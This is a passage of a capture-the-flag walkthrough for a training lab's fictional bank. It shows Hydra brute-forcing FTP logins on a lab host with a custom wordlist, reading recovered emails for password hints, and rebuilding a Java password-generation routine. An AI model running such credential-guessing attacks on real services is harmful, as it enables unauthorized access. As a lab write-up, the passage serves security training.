-</span><span class='line'>[21][ftp] host: 192.168.1.20   login: sdadmin   password: donovin1998
-</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
-</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-05-08 06:13:01</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We log in as sdadmin / donovin1998 and repeat the process:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">sdadmin</span><span class="err">@</span><span class="nl">slax</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">mailserv_download</span><span class="o">/</span><span class="mf">2010122216451.f</span><span class="mi">81L</span><span class="n">tw4R010211</span><span class="p">.</span><span class="n">part3</span> <span class="o">|</span> <span class="n">strings</span> <span class="o">|</span> <span class="n">egrep</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;([0-9][0-9].*)&quot;</span>
-</span><span class='line'><span class="mi">32</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">loopBack</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
-</span><span class='line'><span class="mi">33</span>      <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span>
-</span><span class='line'><span class="mi">34</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">encNew</span> <span class="o">=</span><span class="kt">int</span><span class="p">[</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="o">+</span><span class="n">ref</span><span class="p">];</span>
-</span><span class='line'><span class="mi">35</span>      <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
-</span><span class='line'><span class="mi">36</span>      <span class="nf">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="p">(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
-</span><span class='line'><span class="mi">37</span>      <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="n">ch</span><span class="p">];</span> <span class="n">ch</span><span class="o">++</span><span class="p">;}</span>
-</span><span class='line'><span class="mi">38</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encNew</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
-</span><span class='line'><span class="mi">39</span>      <span class="k">if</span><span class="p">(</span><span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;=</span><span class="mi">33</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="mi">33</span><span class="o">+</span><span class="p">(</span><span class="o">++</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
-</span><span class='line'><span class="mi">40</span>      <span class="k">else</span> <span class="nf">if</span><span class="p">(</span><span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&gt;=</span><span class="mi">126</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="mi">126</span><span class="o">-</span><span class="p">(</span><span class="o">--</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
-</span><span class='line'><span class="mi">41</span>      <span class="k">else</span><span class="p">{</span>
-</span><span class='line'><span class="mi">42</span>      <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="p">);</span>
-</span><span class='line'><span class="mi">43</span>      <span class="k">else</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="p">);}}</span>
-</span><span class='line'><span class="mi">44</span>      <span class="k">return</span> <span class="n">encNew</span><span class="p">;}</span> <span class="n">I</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sdadmin@slax:~$ cat mailserv_download/2010122015043.j15Htu1H341102 
-</span><span class='line'>To: sdadmin@nosecbank.com
-</span><span class='line'>CC: 
-</span><span class='line'>Subject: RE: My Son's Birthday
-</span><span class='line'>Date: Mon, 20 Dec 2010 15:04:32 +0500
-</span><span class='line'>Return-Path: &lt;csadmin@nosecbank.com>
-</span><span class='line'>Delived-To: sdadmin:nosecbank.com@nosecbank.com
-</span><span class='line'>Received: (qmail 20281 invoked from network); 20 Dec 2010 10:04:32 -0000
-</span><span class='line'>X-Received: from network (192.168.1.123) by mailserv3-4.us6.service.com; 
-</span><span class='line'>20 Dec 2010 10:04:32 -0000
-</span><span class='line'>Received: from www.nosecbank.com (unknown [198.65.139.32]) by 
-</span><span class='line'>srv3.us6.service.com (Postfix) with ESMTP id D98214787FD for 
-</span><span class='line'>&lt;csadmin@nosecbank.com; Mon, 20 Dec 2010 10:04:32 +0000 (GMT)
-</span><span class='line'>Message-Id: &lt;2010122015043.j15Htu1H341102@www.nosecbank.com>
-</span><span class='line'>Mime-Version: 1.0
-</span><span class='line'>Content-Type: multipart/alternative; 
-</span><span class='line'>boundary="---=_NextPart_000_0000_05F11S20.FGHZWE49"
-</span><span class='line'>X-Mailer: K-Mail; Build 1.0.5510
-</span><span class='line'>Thread-Index: Aa5fqAwT8nsBe3T3T5q67a3Fd22XsZ==
-</span><span class='line'>Message: Hey there Paul!  I would gladly bring myself and my son over 
-</span><span class='line'>tomorrow after work!  I would only be hesitant to come over if you 
-</span><span class='line'>invited Fred over too... He just freaks me out sometimes.  It doesnt 
-</span><span class='line'>help that he locks himself up in his office and is anti-social during 
-</span><span class='line'>lunch hours... On top of that he calls himself the "databaser"!  I mean, 
-</span><span class='line'>who in thier right mind does that?  Either way, I will most likely be 
-</span><span class='line'>there tomorrow.  I look forward to it!   -Mark</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So the dbadmin&rsquo;s password could be related with the word databaser:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# for i in {1..9999}; do echo databaser$i; echo "$i"databaser; echo Databaser$i; echo "$i"Databaser; done > wl
-</span><span class='line'>root@kali32:~# hydra -l dbadmin 192.168.1.20 ftp -P wl 
-</span><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-</span><span class='line'>
-</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-05-08 06:21:55
-</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 39996 login tries (l:1/p:39996), ~39 tries per task
-</span><span class='line'>[DATA] attacking service ftp on port 21
-</span><span class='line'>[21][ftp] host: 192.168.1.20   login: dbadmin   password: databaser60
-</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
-</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-05-08 06:21:55</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We extract the last part of the email and put everything together:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">1</span>       <span class="cm">/*input is username of account*/</span>
-</span><span class='line'><span class="mi">2</span>       <span class="kt">int</span><span class="o">[]</span> <span class="nf">processLoop</span><span class="o">(</span><span class="n">String</span> <span class="n">input</span><span class="o">){</span>
-</span><span class='line'><span class="mi">3</span>         <span class="kt">int</span> <span class="n">strL</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
-</span><span class='line'><span class="mi">4</span>         <span class="kt">int</span> <span class="n">lChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">strL</span><span class="o">-</span><span class="mi">1</span><span class="o">);</span>
-</span><span class='line'><span class="mi">5</span>         <span class="kt">int</span> <span class="n">fChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
-</span><span class='line'><span class="mi">6</span>         <span class="kt">int</span><span class="o">[]</span> <span class="n">encArr</span> <span class="o">=</span> <span class="kt">int</span><span class="o">[</span><span class="n">strL</span><span class="o">+</span><span class="mi">2</span><span class="o">];</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">7</span>         <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strL</span><span class="o">+</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
-</span><span class='line'><span class="mi">8</span>           <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="o">);}</span>
-</span><span class='line'><span class="mi">9</span>           <span class="n">encArr</span><span class="o">[</span><span class="mi">0</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">lChar</span><span class="o">;</span>
-</span><span class='line'><span class="mi">10</span>          <span class="n">encArr</span><span class="o">[</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">fChar</span><span class="o">;</span>
-</span><span class='line'><span class="mi">11</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">backLoop</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
-</span><span class='line'><span class="mi">12</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">loopBack</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
-</span><span class='line'><span class="mi">13</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">loopProcesS</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">14</span>          <span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">15</span>          <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encArr</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
-</span><span class='line'><span class="mi">16</span>            <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">==</span><span class="n">j</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
-</span><span class='line'><span class="mi">17</span>              <span class="kt">int</span> <span class="n">t</span><span class="o">=</span><span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
-</span><span class='line'><span class="mi">18</span>              <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">];</span>
-</span><span class='line'><span class="mi">19</span>              <span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">]=</span><span class="n">t</span><span class="o">;</span><span class="n">j</span><span class="o">--;}</span>
-</span><span class='line'><span class="mi">20</span>      <span class="k">return</span> <span class="n">encArr</span><span class="o">;}</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">21</span>      <span class="cm">/*Note the pseudocode will be implemented with the </span>
-</span><span class='line'><span class="cm">22      root account and my account, we still need to implement it with the csadmin, sdadmin,   </span>
-</span><span class='line'><span class="cm">23      and dbadmin accounts though*/</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">24</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">backLoop</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
-</span><span class='line'><span class="mi">25</span>        <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
-</span><span class='line'><span class="mi">26</span>        <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="o">];</span>
-</span><span class='line'><span class="mi">27</span>        <span class="kt">int</span> <span class="n">ch</span><span class="o">=(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">)/</span><span class="mi">2</span><span class="o">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">28</span>        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ref</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
-</span><span class='line'><span class="mi">29</span>          <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]%</span><span class="n">check</span><span class="o">)+(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);</span>
-</span><span class='line'><span class="mi">30</span>          <span class="k">else</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);}</span>
-</span><span class='line'><span class="mi">31</span>      <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">32</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopBack</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
-</span><span class='line'><span class="mi">33</span>        <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">/</span><span class="mi">2</span><span class="o">;</span>
-</span><span class='line'><span class="mi">34</span>        <span class="kt">int</span><span class="o">[]</span> <span class="n">encNew</span> <span class="o">=</span><span class="kt">int</span><span class="o">[</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">+</span><span class="n">ref</span><span class="o">];</span>
-</span><span class='line'><span class="mi">35</span>        <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">36</span>        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="o">);</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
-</span><span class='line'><span class="mi">37</span>          <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">input</span><span class="o">[</span><span class="n">ch</span><span class="o">];</span> <span class="n">ch</span><span class="o">++;}</span>
-</span><span class='line'><span class="mi">38</span>          <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encNew</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
-</span><span class='line'><span class="mi">39</span>            <span class="k">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&lt;=</span><span class="mi">33</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">33</span><span class="o">+(++</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
-</span><span class='line'><span class="mi">40</span>            <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&gt;=</span><span class="mi">126</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">126</span><span class="o">-(--</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
-</span><span class='line'><span class="mi">41</span>            <span class="k">else</span><span class="o">{</span>
-</span><span class='line'><span class="mi">42</span>              <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]-=(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="o">);</span>
-</span><span class='line'><span class="mi">43</span>              <span class="k">else</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]+=(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">);}}</span>
-</span><span class='line'><span class="mi">44</span>      <span class="k">return</span> <span class="n">encNew</span><span class="o">;}</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">45</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopProcess</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
-</span><span class='line'><span class="mi">46</span>        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
-</span><span class='line'><span class="mi">47</span>          <span class="k">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">41</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
-</span><span class='line'><span class="mi">48</span>          <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">45</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="o">;}</span>
-</span><span class='line'><span class="mi">49</span>      <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After fixing minor issues, we compile the code in Java:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
-</span><span class='line'>
-</span><span class='line'>     <span class="cm">/*input is username of account*/</span>
-</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">processLoop</span><span class="o">(</span><span class="n">String</span> <span class="n">input</span><span class="o">){</span>
-</span><span class='line'>       <span class="kt">int</span> <span class="n">strL</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
-</span><span class='line'>       <span class="kt">int</span> <span class="n">lChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">strL</span><span class="o">-</span><span class="mi">1</span><span class="o">);</span>
-</span><span class='line'>       <span class="kt">int</span> <span class="n">fChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
-</span><span class='line'>       <span class="kt">int</span><span class="o">[]</span> <span class="n">encArr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">strL</span><span class="o">+</span><span class="mi">2</span><span class="o">];</span>
-</span><span class='line'>
-</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strL</span><span class="o">+</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
-</span><span class='line'>         <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="o">);}</span>
-</span><span class='line'>         <span class="n">encArr</span><span class="o">[</span><span class="mi">0</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">lChar</span><span class="o">;</span>
-</span><span class='line'>         <span class="n">encArr</span><span class="o">[</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">fChar</span><span class="o">;</span>
-</span><span class='line'>         <span class="n">encArr</span><span class="o">=</span><span class="n">backLoop</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
-</span><span class='line'>         <span class="n">encArr</span><span class="o">=</span><span class="n">loopBack</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
-</span><span class='line'>         <span class="n">encArr</span><span class="o">=</span><span class="n">loopProcess</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
-</span><span class='line'>
-</span><span class='line'>         <span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">;</span>
-</span><span class='line'>
-</span><span class='line'>         <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
-</span><span class='line'>           <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">==</span><span class="n">j</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
-</span><span class='line'>             <span class="kt">int</span> <span class="n">t</span><span class="o">=</span><span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
-</span><span class='line'>             <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">];</span>
-</span><span class='line'>             <span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">]=</span><span class="n">t</span><span class="o">;</span><span class="n">j</span><span class="o">--;}</span>
-</span><span class='line'>     <span class="k">return</span> <span class="n">encArr</span><span class="o">;}</span>
-</span><span class='line'>
-</span><span class='line'>     <span class="cm">/*Note the pseudocode will be implemented with the </span>
-</span><span class='line'><span class="cm">     root account and my account, we still need to implement it with the csadmin, sdadmin,   </span>
-</span><span class='line'><span class="cm">     and dbadmin accounts though*/</span>
-</span><span class='line'>
